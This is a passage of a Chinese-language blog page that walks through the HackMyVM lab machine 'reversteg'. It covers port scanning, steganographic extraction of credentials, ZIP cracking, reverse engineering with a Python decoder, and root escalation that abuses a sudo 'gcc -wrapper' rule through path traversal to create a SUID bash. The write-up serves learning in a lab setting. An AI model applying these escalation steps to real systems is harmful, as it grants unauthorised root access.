@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="# 一、信息收集
+
+## 1.1 主机发现
+
+使用 `arp-scan` 扫描局域网内存活主机：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.238 08:00:27:C9:A7:8E       PCS Systemtechnik GmbH
+...
+```
+
+确定目标主机 IP 为 `192.168.205.238`。">
+<meta property="og:title" content="hmv_reversteg">
+<meta property="og:description" content="# 一、信息收集
+
+## 1.1 主机发现
+
+使用 `arp-scan` 扫描局域网内存活主机：
+
+```bash
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.238 08:00:27:C9:A7:8E       PCS Systemtechnik GmbH
+...
+```
+
+确定目标主机 IP 为 `192.168.205.238`。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/hmv_reversteg.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>hmv_reversteg</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">hmv_reversteg</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/262" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h1>一、信息收集</h1>
+<h2>1.1 主机发现</h2>
+<p>使用 <code class="notranslate">arp-scan</code> 扫描局域网内存活主机：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+192.168.205.238 08:00:27:C9:A7:8E       PCS Systemtechnik GmbH
+...</pre></div>
+<p>确定目标主机 IP 为 <code class="notranslate">192.168.205.238</code>。</p>
+<h2>1.2 端口扫描</h2>
+<p>使用 <code class="notranslate">nmap</code> 进行全端口扫描：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.238
+...
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+...</pre></div>
+<p>发现开放了 <strong>SSH (22)</strong> 和 <strong>HTTP (80)</strong> 端口。</p>
+<h2>1.3 Web 服务探测</h2>
+<p>访问 Web 服务并查看页面源码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl 192.168.205.238</pre></div>
+<p>在返回的 Apache2 默认页面中，发现两处关键信息：</p>
+<ul>
+<li>HTML 注释中的 MD5 值：<code class="notranslate">117db0148dc179a2c2245c5a30e63ab0</code></li>
+<li>页面底部注释：<code class="notranslate">Some people always don't understand the format of photos.</code></li>
+</ul>
+<p><strong>知识点补充</strong>：在渗透测试中，HTML 注释、响应头、隐藏字段等位置经常会留下敏感信息或线索，应养成仔细检查的习惯。</p>
+<h1>二、隐写分析</h1>
+<h2>2.1 图片文件探测</h2>
+<p>根据注释提示，尝试不同图片格式访问该 MD5 路径：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -s http://192.168.205.238/117db0148dc179a2c2245c5a30e63ab0 <span class="pl-k">|</span> wc -c
+11618
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -s http://192.168.205.238/117db0148dc179a2c2245c5a30e63ab0.png <span class="pl-k">|</span> wc -c
+379011
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -s http://192.168.205.238/117db0148dc179a2c2245c5a30e63ab0.jpg <span class="pl-k">|</span> wc -c
+190696</pre></div>
+<p>通过文件大小差异，确认存在 <code class="notranslate">.png</code> 和 <code class="notranslate">.jpg</code> 两个图片文件，下载进行分析。</p>
+<h2>2.2 图片元数据提取</h2>
+<p>使用 <code class="notranslate">exiftool</code> 提取图片元数据：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ exiftool <span class="pl-k">*</span>
+======== 117db0148dc179a2c2245c5a30e63ab0.jpg
+...
+Comment: 219f26695ac66c93de9de70eebeefea4deb071df71b9b7d7ebcc06eca47ff6e4
+...</pre></div>
+<p>在 JPG 文件的 <code class="notranslate">Comment</code> 字段中发现一串哈希值。</p>
+<p><strong>知识点补充</strong>：<code class="notranslate">exiftool</code> 是分析图片隐写的重要工具，可以提取 EXIF、IPTC、XMP 等多种元数据格式。</p>
+<h2>2.3 LSB 隐写检测</h2>
+<p>使用 <code class="notranslate">zsteg</code> 对 PNG 文件进行 LSB 隐写分析：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ zsteg <span class="pl-k">*</span>
+...
+[.] 117db0148dc179a2c2245c5a30e63ab0.png
+b1,rgb,lsb,xy       .. text: <span class="pl-s"><span class="pl-pds">"</span>morainelake<span class="pl-pds">"</span></span>
+...</pre></div>
+<p>在 RGB 通道的 LSB 中发现隐藏字符串：<code class="notranslate">morainelake</code>。</p>
+<p><strong>知识点补充</strong>：LSB (Least Significant Bit) 隐写是一种常见的图片隐写技术，通过修改像素值的最低有效位来隐藏数据，<code class="notranslate">zsteg</code> 可以自动检测多种 LSB 隐写模式。</p>
+<h2>2.4 Steghide 提取</h2>
+<p>使用提取到的密码 <code class="notranslate">morainelake</code> 解密 JPG 文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ steghide --extract -sf 117db0148dc179a2c2245c5a30e63ab0.jpg -p <span class="pl-s"><span class="pl-pds">"</span>morainelake<span class="pl-pds">"</span></span>
+wrote extracted data to <span class="pl-s"><span class="pl-pds">"</span>secret.zip<span class="pl-pds">"</span></span>.</pre></div>
+<p>成功提取出加密的 ZIP 压缩包。</p>
+<p><strong>知识点补充</strong>：<code class="notranslate">steghide</code> 支持对 JPEG、BMP、WAV、AU 格式文件进行隐写，使用 AES 加密算法保护嵌入数据。</p>
+<h2>2.5 ZIP 密码破解</h2>
+<p>使用 <code class="notranslate">zip2john</code> 提取哈希后，尝试 <code class="notranslate">john</code> 爆破：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ zip2john secret.zip <span class="pl-k">&gt;</span> <span class="pl-c1">hash</span>
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt <span class="pl-c1">hash</span>
+...
+0g 0:00:00:00 DONE</pre></div>
+<p>使用常规字典未能破解，尝试密码复用成功解压：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ unzip secret.zip
+Archive:  secret.zip
+[secret.zip] secret/secret.txt password: morainelake
+extracting: secret/secret.txt
+
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ cat secret/secret.txt
+morainelake:660930334</pre></div>
+<p>获得 SSH 凭证：<code class="notranslate">morainelake:660930334</code>。</p>
+<h1>三、SSH 登录与初步探测</h1>
+<h2>3.1 SSH 连接</h2>
+<p>使用获取的凭证登录目标系统：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ ssh morainelake@192.168.205.238
+morainelake@192.168.205.238<span class="pl-s"><span class="pl-pds">'</span>s password: </span>
+<span class="pl-s">...</span>
+<span class="pl-s">$ id</span>
+<span class="pl-s">uid=1002(morainelake) gid=1002(morainelake) groups=1002(morainelake)</span></pre></div>
+<p>成功获取 <code class="notranslate">morainelake</code> 用户的 Shell。</p>
+<h2>3.2 信息收集</h2>
+<p>查看用户家目录：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ ls -al
+...
+-rw-r--r-- 1 root        root        4095 Oct  1 08:29 <span class="pl-c1">history</span>
+-rw-r--r-- 1 root        root         543 Feb 20  2025 note.txt
+...</pre></div>
+<p>读取提示文件：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ cat note.txt
+morainelake is a very careless user with a very bad memory. He always throws things aside after organizing them. This <span class="pl-k">time</span> he accidentally lost the flag. Fortunately, the administrator has the historical records, but there are too many records to find the corresponding correct flag. Can you find it correctly<span class="pl-k">?</span>
+...</pre></div>
+<p>提示 flag 在历史记录中，但存在大量干扰项。</p>
+<h2>3.3 提取 User Flag</h2>
+<p>从 <code class="notranslate">history</code> 文件中过滤 flag：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ grep -i <span class="pl-s"><span class="pl-pds">"</span>flag<span class="pl-pds">"</span></span> <span class="pl-c1">history</span>
+flag{f1ab46839868f376d90b3064b13aaeab}
+flag{ae474208d0e99cae29efdf25d7003c15}
+...
+（共约 88 个 flag）</pre></div>
+<p><strong>注</strong>：需要通过提交验证找出正确的 User Flag（建议使用 Burp Suite Intruder 批量测试）。</p>
+<h1>四、权限提升</h1>
+<h2>4.1 系统信息收集</h2>
+<p>检查 SUID 文件、sudo 权限、网络监听等：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ find / -perm -4000 -type f <span class="pl-k">2&gt;</span>/dev/null
+...
+-rwsr-xr-x 1 root root 157192 Jan 21  2024 /usr/bin/sudo
+
+$ sudo -l
+Sorry, user morainelake may not run sudo on reversteg.
+
+$ ss -tulnp
+...
+tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:<span class="pl-k">*</span>
+...</pre></div>
+<p>发现 <code class="notranslate">/opt</code> 目录下有可疑程序：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ ls -al /opt
+...
+-rwxr-xr-x  1 root root 17088 Feb 12  2025 reverse</pre></div>
+<h2>4.2 逆向分析</h2>
+<p>将可执行文件传输到本地进行逆向分析：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">morainelake@reversteg:/opt$ scp reverse kali@192.168.205.128:/mnt/hgfs/gx/x/tmp</pre></div>
+<p>使用 IDA Pro 分析，关键代码逻辑如下：</p>
+<ol>
+<li>程序通过 XOR 和凯撒密码解密多个字符串</li>
+<li>将解密后的字符串作为密码验证</li>
+<li>最终输出 <code class="notranslate">flower</code> 作为提示</li>
+</ol>
+<p>编写 Python 脚本解密：</p>
+<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">def</span> <span class="pl-en">xor_decrypt</span>(<span class="pl-s1">data</span>, <span class="pl-s1">key</span>):
+    <span class="pl-k">if</span> <span class="pl-en">isinstance</span>(<span class="pl-s1">data</span>, <span class="pl-s1">str</span>):
+        <span class="pl-s1">data</span> <span class="pl-c1">=</span> <span class="pl-s1">data</span>.<span class="pl-c1">encode</span>()
+    <span class="pl-k">return</span> <span class="pl-en">bytes</span>([<span class="pl-s1">b</span> <span class="pl-c1">^</span> <span class="pl-s1">key</span> <span class="pl-k">for</span> <span class="pl-s1">b</span> <span class="pl-c1">in</span> <span class="pl-s1">data</span>]).<span class="pl-c1">decode</span>()
+
+<span class="pl-k">def</span> <span class="pl-en">caesar_decrypt</span>(<span class="pl-s1">text</span>, <span class="pl-s1">shift</span>):
+    <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-s">""</span>
+    <span class="pl-k">for</span> <span class="pl-s1">char</span> <span class="pl-c1">in</span> <span class="pl-s1">text</span>:
+        <span class="pl-k">if</span> <span class="pl-s">'a'</span> <span class="pl-c1">&lt;=</span> <span class="pl-s1">char</span> <span class="pl-c1">&lt;=</span> <span class="pl-s">'z'</span>:
+            <span class="pl-s1">result</span> <span class="pl-c1">+=</span> <span class="pl-en">chr</span>((<span class="pl-en">ord</span>(<span class="pl-s1">char</span>) <span class="pl-c1">-</span> <span class="pl-en">ord</span>(<span class="pl-s">'a'</span>) <span class="pl-c1">-</span> <span class="pl-s1">shift</span>) <span class="pl-c1">%</span> <span class="pl-c1">26</span> <span class="pl-c1">+</span> <span class="pl-en">ord</span>(<span class="pl-s">'a'</span>))
+        <span class="pl-k">elif</span> <span class="pl-s">'A'</span> <span class="pl-c1">&lt;=</span> <span class="pl-s1">char</span> <span class="pl-c1">&lt;=</span> <span class="pl-s">'Z'</span>:
+            <span class="pl-s1">result</span> <span class="pl-c1">+=</span> <span class="pl-en">chr</span>((<span class="pl-en">ord</span>(<span class="pl-s1">char</span>) <span class="pl-c1">-</span> <span class="pl-en">ord</span>(<span class="pl-s">'A'</span>) <span class="pl-c1">-</span> <span class="pl-s1">shift</span>) <span class="pl-c1">%</span> <span class="pl-c1">26</span> <span class="pl-c1">+</span> <span class="pl-en">ord</span>(<span class="pl-s">'A'</span>))
+        <span class="pl-k">else</span>:
+            <span class="pl-s1">result</span> <span class="pl-c1">+=</span> <span class="pl-s1">char</span>
+    <span class="pl-k">return</span> <span class="pl-s1">result</span>
+
+<span class="pl-s1">v7</span> <span class="pl-c1">=</span> <span class="pl-c1">8203321</span>
+<span class="pl-s1">v6</span> <span class="pl-c1">=</span> <span class="pl-s">"/, 8:("</span>
+<span class="pl-s1">v5_7</span> <span class="pl-c1">=</span> <span class="pl-s">"!!|}yx{z"</span>
+<span class="pl-s1">v5</span> <span class="pl-c1">=</span> <span class="pl-s">"(;$)(#"</span>
+<span class="pl-s1">v19</span> <span class="pl-c1">=</span> <span class="pl-c1">77</span>
+
+<span class="pl-s1">v7_bytes</span> <span class="pl-c1">=</span> <span class="pl-s1">v7</span>.<span class="pl-c1">to_bytes</span>(<span class="pl-c1">4</span>, <span class="pl-s">'little'</span>).<span class="pl-c1">rstrip</span>(<span class="pl-s">b'<span class="pl-cce">\x00</span>'</span>)
+<span class="pl-en">print</span>(<span class="pl-s">f"v18: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">xor_decrypt</span>(<span class="pl-s1">v5_7</span>, <span class="pl-s1">v19</span>)<span class="pl-kos">}</span></span>"</span>)      <span class="pl-c"># ll104567</span>
+<span class="pl-en">print</span>(<span class="pl-s">f"v17: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">xor_decrypt</span>(<span class="pl-s1">v6</span>, <span class="pl-s1">v19</span>)<span class="pl-kos">}</span></span>"</span>)        <span class="pl-c"># bamuwe</span>
+<span class="pl-en">print</span>(<span class="pl-s">f"v16: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">xor_decrypt</span>(<span class="pl-s1">v7_bytes</span>, <span class="pl-s1">v19</span>)<span class="pl-kos">}</span></span>"</span>)  <span class="pl-c"># ta0</span>
+<span class="pl-en">print</span>(<span class="pl-s">f"v15: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">xor_decrypt</span>(<span class="pl-s1">v5</span>, <span class="pl-s1">v19</span>)<span class="pl-kos">}</span></span>"</span>)        <span class="pl-c"># eviden</span>
+<span class="pl-en">print</span>(<span class="pl-s">f"Final: <span class="pl-s1"><span class="pl-kos">{</span><span class="pl-en">caesar_decrypt</span>(<span class="pl-s">'pvygob'</span>, <span class="pl-c1">10</span>)<span class="pl-kos">}</span></span>"</span>)  <span class="pl-c"># flower</span></pre></div>
+<p><strong>知识点补充</strong>：凯撒密码是一种替换式密码，通过固定偏移量移动字母位置。XOR 加密具有对称性，即 <code class="notranslate">A XOR K = B</code> 时，<code class="notranslate">B XOR K = A</code>。</p>
+<h2>4.3 横向移动</h2>
+<p>尝试切换到 <code class="notranslate">welcome</code> 用户，组合解密的字符串作为密码：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">$ su welcome
+Password: ll104567bamuweta0eviden
+$ bash
+welcome@reversteg:/home$ id
+uid=1001(welcome) gid=1001(welcome) groups=1001(welcome)</pre></div>
+<h2>4.4 Sudo 提权分析</h2>
+<p>检查 <code class="notranslate">welcome</code> 用户的 sudo 权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ sudo -l
+Matching Defaults entries <span class="pl-k">for</span> welcome on reversteg:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin<span class="pl-cce">\:</span>/usr/local/bin<span class="pl-cce">\:</span>/usr/sbin<span class="pl-cce">\:</span>/usr/bin<span class="pl-cce">\:</span>/sbin<span class="pl-cce">\:</span>/bin
+
+User welcome may run the following commands on reversteg:
+    (ALL <span class="pl-c1">:</span> ALL) NOPASSWD: /usr/bin/gcc -wrapper /opt/<span class="pl-k">*</span></pre></div>
+<p>发现 <code class="notranslate">welcome</code> 用户可以无密码执行 <code class="notranslate">gcc -wrapper /opt/*</code> 命令。</p>
+<p><strong>知识点补充</strong>：<code class="notranslate">gcc</code> 的 <code class="notranslate">-wrapper</code> 参数允许指定一个包装程序，在编译过程中会先执行该包装程序。这个特性可以被利用来执行任意命令。</p>
+<h2>4.5 GCC Wrapper 提权利用</h2>
+<h3>漏洞原理</h3>
+<p><code class="notranslate">gcc -wrapper</code> 参数的设计初衷是为了在编译前后执行额外的处理程序，但当结合 sudo 权限和路径遍历时，可以突破 <code class="notranslate">/opt/*</code> 的限制：</p>
+<ol>
+<li>使用 <code class="notranslate">..</code> 进行路径遍历，指向 <code class="notranslate">/tmp</code> 等可写目录</li>
+<li>创建恶意脚本，利用 root 权限执行任意命令</li>
+<li>通过 SUID 二进制文件维持权限</li>
+</ol>
+<h3>利用步骤</h3>
+<p>创建提权脚本：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ cat <span class="pl-k">&gt;</span> /tmp/a.sh <span class="pl-s"><span class="pl-k">&lt;&lt;</span> '<span class="pl-k">EOF</span>'</span>
+<span class="pl-s">#!/bin/bash</span>
+<span class="pl-s">cp /bin/bash /tmp/rootbash</span>
+<span class="pl-s">chmod +s /tmp/rootbash</span>
+<span class="pl-s"><span class="pl-k">EOF</span></span></pre></div>
+<p>赋予执行权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ chmod +x /tmp/a.sh</pre></div>
+<p>创建一个虚拟的 C 源文件（gcc 需要编译目标）：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>int main(){return 0;}<span class="pl-pds">'</span></span> <span class="pl-k">&gt;</span> /tmp/dummy.c</pre></div>
+<p><strong>关键利用命令</strong>：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ sudo /usr/bin/gcc -wrapper /opt/../tmp/a.sh,--version /tmp/dummy.c</pre></div>
+<p><strong>命令解析</strong>：</p>
+<ul>
+<li><code class="notranslate">/opt/../tmp/a.sh</code>：通过路径遍历绕过 <code class="notranslate">/opt/*</code> 限制</li>
+<li><code class="notranslate">,--version</code>：<code class="notranslate">,</code> 作为分隔符，后续参数传递给 gcc</li>
+<li>执行时会先以 root 权限运行 <code class="notranslate">/tmp/a.sh</code></li>
+</ul>
+<p>验证 SUID 二进制文件是否创建成功：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ ls -la /tmp/rootbash
+-rwsr-sr-x 1 root root 1168776 Oct  1 08:42 /tmp/rootbash</pre></div>
+<p><strong>知识点补充</strong>：</p>
+<ul>
+<li><strong>SUID (Set User ID)</strong>：当可执行文件设置了 SUID 位时，执行该文件的用户会临时获得文件所有者的权限</li>
+<li><strong>-p 参数</strong>：bash 的 <code class="notranslate">-p</code> 参数会保持有效用户 ID (effective UID)，防止 bash 自动降低权限</li>
+</ul>
+<h2>4.6 获取 Root Shell</h2>
+<p>使用创建的 SUID bash 获取 root 权限：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@reversteg:/home$ /tmp/rootbash -p
+rootbash-5.0# id
+uid=1001(welcome) gid=1001(welcome) euid=0(root) egid=0(root) groups=0(root),1001(welcome)</pre></div>
+<p>成功获取 root 权限（euid=0）。</p>
+<p><strong>知识点补充</strong>：</p>
+<ul>
+<li><strong>uid vs euid</strong>：uid 是实际用户 ID，euid 是有效用户 ID。系统权限检查基于 euid</li>
+<li>这种方式获取的权限中，uid 仍是普通用户，但 euid 为 root，足以执行特权操作</li>
+</ul>
+<h1>五、获取 Root Flag</h1>
+<p>读取 root 目录下的 flag：</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">rootbash-5.0# cat /root/root.txt
+flag{4f1eab505b71cd930b0eccd83ff0cfef}</pre></div>
+<p>成功获取 Root Flag：<code class="notranslate">flag{4f1eab505b71cd930b0eccd83ff0cfef}</code></p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
